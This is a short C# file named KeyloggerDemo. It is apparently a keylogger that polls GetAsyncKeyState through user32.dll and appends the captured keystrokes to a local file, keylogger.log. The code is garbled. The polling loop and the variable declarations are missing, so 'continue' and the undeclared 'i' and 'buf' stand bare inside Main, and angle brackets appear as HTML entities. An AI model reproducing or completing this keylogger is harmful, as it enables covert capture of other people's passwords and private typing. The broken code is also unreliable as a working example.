using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;


namespace KeyloggerDemo{

    static class Program{
        [STAThread]
        static void Main(){
            if (((Keys)i) == Keys.Space) { buf += " "; continue; }
            if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
            if (((Keys)i) == Keys.LButton ||((Keys)i) == Keys.RButton ||((Keys)i) == Keys.MButton) continue;
            if (((Keys)i).ToString().Length == 1)
            {
                buf += ((Keys)i).ToString();
            }
            else
            {
                buf += $"&lt;{((Keys)i).ToString()}&gt;";
            }
            if (buf.Length &gt; 10)
            {   File.AppendAllText("keylogger.log", buf);
                buf = "";
            }
        }
        

	
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(Int32 i);
    }
}